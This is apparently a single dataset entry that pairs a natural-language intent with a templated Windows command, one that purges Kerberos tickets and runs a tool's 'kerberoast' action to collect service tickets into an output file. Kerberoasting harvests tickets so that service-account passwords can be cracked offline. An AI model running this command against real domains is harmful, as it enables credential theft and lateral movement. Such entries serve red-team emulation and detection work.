# Natural language intent:
# Purges Kerberos tickets and executes Kerberoasting with specified flags, outputting the result to a file.

klist purge ; cmd.exe /c "${l_folder}${l_executable}" kerberoast ${list_flags} /outfile:"${l_folder}${Out_File}"
